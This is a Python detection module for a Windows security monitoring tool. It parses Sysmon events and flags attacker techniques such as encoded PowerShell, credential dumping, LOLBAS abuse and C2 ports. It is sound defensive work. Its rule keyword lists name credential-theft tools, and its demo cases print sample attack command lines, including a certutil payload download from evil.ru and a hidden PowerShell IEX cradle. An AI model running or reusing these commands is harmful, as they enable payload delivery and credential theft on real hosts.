"""
ThreatX SOC — Detection Engine  (detector.py)
==============================================
Reads Sysmon events via wevtutil, applies detection rules,
and populates the shared `cases` list consumed by server.py.

Exposes:
  cases          list[dict]       – shared case store
  cases_lock     threading.Lock() – guards `cases`
  ALL_RULES      list             – loaded detection rules
  POLL_INTERVAL  int              – seconds between polls
  get_active_cases() -> list
  clear_cases()
  run()                           – daemon thread entry point
"""

import threading
import subprocess
import xml.etree.ElementTree as ET
from datetime import datetime
import time
import uuid
import sys

_WIN = sys.platform == 'win32'
_SUBPROCESS_FLAGS = {'creationflags': 0x08000000} if _WIN else {}

# ── Shared state ─────────────────────────────────────────────────────
cases         = []
cases_lock    = threading.Lock()
POLL_INTERVAL = 30   # seconds between Sysmon polls

# ── Sysmon XML constants ──────────────────────────────────────────────
SYSMON_LOG = "Microsoft-Windows-Sysmon/Operational"
NS         = {"e": "http://schemas.microsoft.com/win/2004/08/events/event"}

_no_sysmon_warned = False
_demo_injected    = False


# ── Public API ────────────────────────────────────────────────────────
def get_active_cases():
    with cases_lock:
        return sorted(
            [c for c in cases if c["status"] != "CLOSED"],
            key=lambda x: x["timestamp"], reverse=True
        )

def clear_cases():
    with cases_lock:
        cases.clear()


# ── Internal helpers ──────────────────────────────────────────────────
def _xml_data(event, field):
    for d in event.findall(".//e:Data", NS):
        if d.get("Name") == field:
            return (d.text or "").strip()
    return ""

def _make_case(title, severity, host, user, timestamp, description, raw_detail, mitre, source_eid):
    ts  = timestamp or datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    uid = uuid.uuid4().hex[:4].upper()
    stamp = ts.replace("-","").replace(" ","").replace(":","")[:12]
    return {
        "id":          f"TX-{stamp}-{uid}",
        "title":       title,
        "severity":    severity,
        "status":      "OPEN",
        "host":        host,
        "user":        user,
        "timestamp":   ts,
        "description": description,
        "raw_detail":  raw_detail,
        "mitre":       mitre,
        "source_eid":  source_eid,
    }

def _read_sysmon(count=200):
    try:
        result = subprocess.run(
            ["wevtutil", "qe", SYSMON_LOG, f"/c:{count}", "/rd:true", "/f:xml"],
            capture_output=True, text=True, timeout=20,
            **_SUBPROCESS_FLAGS,
        )
        if result.returncode != 0:
            return []
        root = ET.fromstring(f"<Root>{result.stdout}</Root>")
        out  = []
        for ev in root.findall("e:Event", NS):
            try:
                eid    = int(ev.find("e:System/e:EventID", NS).text)
                rec_el = ev.find("e:System/e:EventRecordID", NS)
                rec_id = int(rec_el.text) if rec_el is not None and rec_el.text else 0
                ts_raw = ev.find("e:System/e:TimeCreated", NS).get("SystemTime", "")
                ts     = ts_raw[:19].replace("T", " ")
                host   = ev.find("e:System/e:Computer", NS).text or "UNKNOWN"
                user   = _xml_data(ev,"User") or _xml_data(ev,"SubjectUserName") or "SYSTEM"
                out.append({"eid":eid, "rec_id":rec_id, "timestamp":ts,
                             "host":host, "user":user, "raw":ev})
            except Exception:
                continue
        return out
    except FileNotFoundError:
        global _no_sysmon_warned
        if not _no_sysmon_warned:
            print("[detector] wevtutil not found — run as Administrator on Windows. Inserting demo cases.")
            _no_sysmon_warned = True
        return []
    except Exception as e:
        print(f"[detector] Sysmon read error: {e}")
        return []


# ── Detection rules ───────────────────────────────────────────────────
# Each rule receives (ev_dict, raw_xml_element) and returns a case dict or None.

def _rule_ps_encoded(ev, raw):
    if ev["eid"] != 1: return None
    img = _xml_data(raw, "Image").lower()
    cmd = _xml_data(raw, "CommandLine").lower()
    if not ("powershell" in img or "pwsh" in img): return None
    if not any(x in cmd for x in ["-enc", "-encodedcommand", "-e ", "-ec "]): return None
    return _make_case(
        "PowerShell EncodedCommand Execution", "CRITICAL",
        ev["host"], ev["user"], ev["timestamp"],
        "PowerShell launched with -EncodedCommand — common obfuscation used by malware and post-exploitation frameworks.",
        f"Image: {_xml_data(raw,'Image')}\nCommandLine: {_xml_data(raw,'CommandLine')}\nParentImage: {_xml_data(raw,'ParentImage')}",
        "T1059.001 — PowerShell", 1)

def _rule_office_shell(ev, raw):
    if ev["eid"] != 1: return None
    parent = _xml_data(raw, "ParentImage").lower()
    img    = _xml_data(raw, "Image").lower()
    office = ["winword.exe","excel.exe","powerpnt.exe","outlook.exe","onenote.exe"]
    shells = ["cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe"]
    if not any(p in parent for p in office): return None
    if not any(s in img    for s in shells): return None
    return _make_case(
        "Office App Spawned Shell — Macro Attack", "HIGH",
        ev["host"], ev["user"], ev["timestamp"],
        "An Office application spawned a shell process — classic macro-based initial access or phishing payload execution.",
        f"ParentImage: {_xml_data(raw,'ParentImage')}\nImage: {_xml_data(raw,'Image')}\nCommandLine: {_xml_data(raw,'CommandLine')}",
        "T1566.001 — Spearphishing Attachment", 1)

def _rule_mimikatz(ev, raw):
    if ev["eid"] != 1: return None
    combined = (_xml_data(raw,"CommandLine") + _xml_data(raw,"Image")).lower()
    if not any(x in combined for x in ["mimikatz","sekurlsa","lsadump","kerberos::","privilege::debug","dpapi::"]): return None
    return _make_case(
        "Mimikatz / Credential Dumping Tool Detected", "CRITICAL",
        ev["host"], ev["user"], ev["timestamp"],
        "Mimikatz or credential dumping activity detected via command-line or image name. Immediate response required.",
        f"Image: {_xml_data(raw,'Image')}\nCommandLine: {_xml_data(raw,'CommandLine')}",
        "T1003 — OS Credential Dumping", 1)

def _rule_lolbas(ev, raw):
    if ev["eid"] != 1: return None
    img = _xml_data(raw, "Image").lower()
    cmd = _xml_data(raw, "CommandLine").lower()
    checks = {
        "certutil.exe":  ["-urlcache","-decode","-encode"],
        "regsvr32.exe":  ["scrobj","/s /u","http"],
        "mshta.exe":     ["http://","https://","vbscript:","javascript:"],
        "rundll32.exe":  ["javascript:","vbscript:","http"],
        "wmic.exe":      ["process call create","shadowcopy delete"],
        "bitsadmin.exe": ["/transfer","/download"],
        "installutil.exe": ["/logfile","/logtoconsole"],
    }
    for binary, triggers in checks.items():
        if binary in img and any(t in cmd for t in triggers):
            name = binary.split(".")[0].upper()
            return _make_case(
                f"LOLBAS Abuse: {name}", "HIGH",
                ev["host"], ev["user"], ev["timestamp"],
                f"Living-off-the-land binary '{binary}' invoked with suspicious arguments — common proxy execution technique.",
                f"Image: {_xml_data(raw,'Image')}\nCommandLine: {_xml_data(raw,'CommandLine')}\nParentImage: {_xml_data(raw,'ParentImage')}",
                "T1218 — Signed Binary Proxy Execution", 1)
    return None

def _rule_c2_port(ev, raw):
    if ev["eid"] != 3: return None
    port = _xml_data(raw, "DestinationPort")
    C2 = {"4444":"Metasploit","1337":"C2 Framework","31337":"C2 Framework",
          "8443":"Reverse Shell","9001":"Tor/C2","6666":"Malware C2","4899":"RAdmin"}
    if port not in C2: return None
    dst = _xml_data(raw, "DestinationIp")
    img = _xml_data(raw, "Image").split("\\")[-1]
    return _make_case(
        f"Outbound C2 Port {port} ({C2[port]})", "CRITICAL",
        ev["host"], ev["user"], ev["timestamp"],
        f"{img} connected to {dst}:{port} — port associated with {C2[port]}. Possible command-and-control channel.",
        f"Image: {_xml_data(raw,'Image')}\nDestination: {dst}:{port}\nProtocol: {_xml_data(raw,'Protocol')}",
        "T1071 — Application Layer Protocol", 3)

def _rule_suspicious_outbound(ev, raw):
    if ev["eid"] != 3: return None
    img = _xml_data(raw, "Image").lower()
    sus = ["powershell","pwsh","cmd.exe","wscript","cscript","mshta","regsvr32","rundll32"]
    if not any(p in img for p in sus): return None
    if _xml_data(raw, "Initiated") != "true": return None
    dst = _xml_data(raw, "DestinationIp")
    private = ["10.","192.168.","172.16.","172.17.","172.18.","172.19.","172.2","172.3",
               "127.","::1","0.0.0.0","169.254."]
    if any(dst.startswith(x) for x in private): return None
    port = _xml_data(raw, "DestinationPort")
    proc = img.split("\\")[-1] if "\\" in img else img
    return _make_case(
        f"Suspicious Outbound: {proc} → {dst}:{port}", "HIGH",
        ev["host"], ev["user"], ev["timestamp"],
        "Shell/interpreter process initiated outbound connection to external host — possible download cradle or C2 beacon.",
        f"Image: {_xml_data(raw,'Image')}\nDestination: {dst}:{port}\nProtocol: {_xml_data(raw,'Protocol')}",
        "T1071 — Application Layer Protocol", 3)

def _rule_lsass_access(ev, raw):
    if ev["eid"] != 10: return None
    if "lsass.exe" not in _xml_data(raw, "TargetImage").lower(): return None
    return _make_case(
        "LSASS Memory Access — Credential Theft", "CRITICAL",
        ev["host"], ev["user"], ev["timestamp"],
        "A process accessed LSASS memory — primary indicator of credential dumping (Mimikatz, ProcDump, Task Manager dump).",
        f"SourceImage: {_xml_data(raw,'SourceImage')}\nTargetImage: {_xml_data(raw,'TargetImage')}\nGrantedAccess: {_xml_data(raw,'GrantedAccess')}",
        "T1003.001 — LSASS Memory", 10)

def _rule_remote_thread(ev, raw):
    if ev["eid"] != 8: return None
    src = _xml_data(raw, "SourceImage").split("\\")[-1]
    tgt = _xml_data(raw, "TargetImage").split("\\")[-1]
    return _make_case(
        f"Process Injection: {src} → {tgt}", "HIGH",
        ev["host"], ev["user"], ev["timestamp"],
        f"CreateRemoteThread: {src} injected a thread into {tgt}. Indicates code injection or process hollowing.",
        f"SourceImage: {_xml_data(raw,'SourceImage')}\nTargetImage: {_xml_data(raw,'TargetImage')}\nStartAddress: {_xml_data(raw,'StartAddress')}",
        "T1055 — Process Injection", 8)

def _rule_wmi(ev, raw):
    if ev["eid"] not in [19, 20, 21]: return None
    label = {19:"Filter", 20:"Consumer", 21:"Binding"}[ev["eid"]]
    name  = _xml_data(raw,"Name") or _xml_data(raw,"Consumer") or "Unknown"
    return _make_case(
        f"WMI {label} — Persistence Indicator", "HIGH",
        ev["host"], ev["user"], ev["timestamp"],
        f"WMI {label} registered. WMI subscriptions are commonly abused for persistence and lateral movement.",
        f"EventID: {ev['eid']}\nName/Consumer: {name}\nUser: {ev['user']}",
        "T1047 — Windows Management Instrumentation", ev["eid"])

def _rule_process_tampering(ev, raw):
    if ev["eid"] != 25: return None
    img = _xml_data(raw, "Image").split("\\")[-1]
    return _make_case(
        f"Process Tampering: {img}", "CRITICAL",
        ev["host"], ev["user"], ev["timestamp"],
        "Sysmon detected process image tampering — hollowing, herpaderping, or doppelgänging technique.",
        f"Image: {_xml_data(raw,'Image')}\nType: {_xml_data(raw,'Type')}",
        "T1055.012 — Process Hollowing", 25)

def _rule_unsigned_driver(ev, raw):
    if ev["eid"] != 6: return None
    status = _xml_data(raw, "SignatureStatus").lower()
    if status in ("valid", ""): return None
    img = _xml_data(raw, "ImageLoaded").split("\\")[-1]
    return _make_case(
        f"Unsigned Driver Loaded: {img}", "HIGH",
        ev["host"], ev["user"], ev["timestamp"],
        "An unsigned or invalidly signed kernel driver was loaded — possible rootkit or kernel-level persistence.",
        f"ImageLoaded: {_xml_data(raw,'ImageLoaded')}\nSignature: {_xml_data(raw,'Signature')}\nSignatureStatus: {status}",
        "T1014 — Rootkit", 6)

def _rule_suspicious_dns(ev, raw):
    if ev["eid"] != 22: return None
    qname = _xml_data(raw, "QueryName").lower()
    tor   = ".onion" in qname
    dga   = len(qname.split(".")[0]) > 22 and qname[0].isalpha()
    sus   = any(qname.endswith(t) for t in [".ru",".cn",".tk",".xyz",".top",".pw",".cc",".su",".to"])
    if not (tor or dga or sus): return None
    sev    = "HIGH" if (tor or dga) else "MEDIUM"
    reason = "Tor hidden service" if tor else ("DGA-like domain" if dga else "Suspicious TLD")
    return _make_case(
        f"Suspicious DNS: {qname[:55]}", sev,
        ev["host"], ev["user"], ev["timestamp"],
        f"{reason} queried — potential C2 beacon, DGA malware, or data exfiltration attempt.",
        f"QueryName: {_xml_data(raw,'QueryName')}\nImage: {_xml_data(raw,'Image')}\nQueryResults: {_xml_data(raw,'QueryResults')}",
        "T1071.004 — DNS", 22)

def _rule_script_drop(ev, raw):
    if ev["eid"] != 11: return None
    fname = _xml_data(raw, "TargetFilename").lower()
    exts  = [".ps1",".vbs",".js",".hta",".bat",".cmd",".wsf",".jse",".vbe"]
    dirs  = ["\\temp\\","\\tmp\\","\\appdata\\","\\downloads\\","\\public\\","\\desktop\\"]
    if not (any(fname.endswith(e) for e in exts) and any(d in fname for d in dirs)): return None
    return _make_case(
        "Script Dropped in Suspicious Location", "MEDIUM",
        ev["host"], ev["user"], ev["timestamp"],
        "A script file was created in a user-writable directory — possible staging for execution.",
        f"TargetFilename: {_xml_data(raw,'TargetFilename')}\nImage: {_xml_data(raw,'Image')}",
        "T1059 — Command and Scripting Interpreter", 11)


ALL_RULES = [
    _rule_ps_encoded,
    _rule_office_shell,
    _rule_mimikatz,
    _rule_lolbas,
    _rule_c2_port,
    _rule_suspicious_outbound,
    _rule_lsass_access,
    _rule_remote_thread,
    _rule_wmi,
    _rule_process_tampering,
    _rule_unsigned_driver,
    _rule_suspicious_dns,
    _rule_script_drop,
]


# ── Deduplication — skip events already evaluated ────────────────────
_seen_events = set()
_seen_lock   = threading.Lock()

def _event_fp(ev):
    if ev.get("rec_id"):
        return ev["rec_id"]
    return f"{ev['timestamp']}:{ev['host']}:{ev['eid']}"


# ── Demo cases (injected once when Sysmon is unavailable) ────────────
def _inject_demo():
    global _demo_injected
    if _demo_injected:
        return
    _demo_injected = True
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    demo = [
        _make_case(
            "PowerShell EncodedCommand Execution", "CRITICAL",
            "HOST-01", "john.doe", now,
            "PowerShell launched with -EncodedCommand — common obfuscation technique used by malware.",
            "Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
            "CommandLine: powershell.exe -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=\n"
            "ParentImage: C:\\Windows\\System32\\cmd.exe",
            "T1059.001 — PowerShell", 1),
        _make_case(
            "LSASS Memory Access — Credential Theft", "CRITICAL",
            "HOST-02", "svc-account", now,
            "A process accessed LSASS memory — primary indicator of credential dumping.",
            "SourceImage: C:\\Tools\\procdump64.exe\n"
            "TargetImage: C:\\Windows\\System32\\lsass.exe\n"
            "GrantedAccess: 0x1fffff",
            "T1003.001 — LSASS Memory", 10),
        _make_case(
            "Office App Spawned Shell — Macro Attack", "HIGH",
            "HOST-01", "sarah.k", now,
            "Word.exe spawned cmd.exe — classic macro-based phishing payload execution.",
            "ParentImage: C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE\n"
            "Image: C:\\Windows\\System32\\cmd.exe\n"
            "CommandLine: cmd.exe /c powershell -nop -w hidden -c \"IEX(...)\"",
            "T1566.001 — Spearphishing Attachment", 1),
        _make_case(
            "Outbound C2 Port 4444 (Metasploit)", "CRITICAL",
            "HOST-03", "admin", now,
            "cmd.exe connected to 185.220.101.45:4444 — Metasploit default reverse shell port.",
            "Image: C:\\Windows\\System32\\cmd.exe\n"
            "Destination: 185.220.101.45:4444\nProtocol: tcp",
            "T1071 — Application Layer Protocol", 3),
        _make_case(
            "Suspicious DNS: randomxyz12345abcde7f8g.top", "HIGH",
            "HOST-02", "john.doe", now,
            "DGA-like domain queried — potential C2 beacon from compromised host.",
            "QueryName: randomxyz12345abcde7f8g.top\n"
            "Image: C:\\Windows\\System32\\svchost.exe",
            "T1071.004 — DNS", 22),
        _make_case(
            "LOLBAS Abuse: CERTUTIL", "HIGH",
            "HOST-04", "admin", now,
            "certutil.exe used with -urlcache to download remote payload to disk.",
            "Image: C:\\Windows\\System32\\certutil.exe\n"
            "CommandLine: certutil.exe -urlcache -f http://evil.ru/payload.exe C:\\temp\\p.exe",
            "T1218 — Signed Binary Proxy Execution", 1),
        _make_case(
            "Script Dropped in Suspicious Location", "MEDIUM",
            "HOST-01", "sarah.k", now,
            "A .ps1 script was created in the AppData\\Local\\Temp directory.",
            "TargetFilename: C:\\Users\\sarah.k\\AppData\\Local\\Temp\\stage2.ps1\n"
            "Image: C:\\Windows\\System32\\cmd.exe",
            "T1059 — Command and Scripting Interpreter", 11),
        _make_case(
            "Process Injection: explorer.exe → svchost.exe", "HIGH",
            "HOST-03", "SYSTEM", now,
            "CreateRemoteThread detected — possible reflective DLL injection or shellcode injection.",
            "SourceImage: C:\\Windows\\explorer.exe\n"
            "TargetImage: C:\\Windows\\System32\\svchost.exe\n"
            "StartAddress: 0x7ff8a23c1000",
            "T1055 — Process Injection", 8),
    ]
    with cases_lock:
        cases.extend(demo)
    print(f"[detector] Injected {len(demo)} demo cases (Sysmon unavailable)")


# ── Detection loop ────────────────────────────────────────────────────
def _poll_once():
    events = _read_sysmon(200)
    if not events:
        _inject_demo()
        return

    new_cases = []
    for ev in events:
        fp = _event_fp(ev)
        with _seen_lock:
            if fp in _seen_events:
                continue
            _seen_events.add(fp)

        raw = ev["raw"]
        for rule_fn in ALL_RULES:
            try:
                case = rule_fn(ev, raw)
            except Exception:
                continue
            if case:
                new_cases.append(case)
                break   # first matching rule wins; one case per event

    if new_cases:
        with cases_lock:
            cases.extend(new_cases)
        print(f"[detector] +{len(new_cases)} new case(s)  (total open: {len(get_active_cases())})")


def run():
    print(f"[detector] Engine started — {len(ALL_RULES)} rules loaded, polling every {POLL_INTERVAL}s")
    _poll_once()          # immediate first pass on startup
    while True:
        time.sleep(POLL_INTERVAL)
        try:
            _poll_once()
        except Exception as e:
            print(f"[detector] Poll error: {e}")
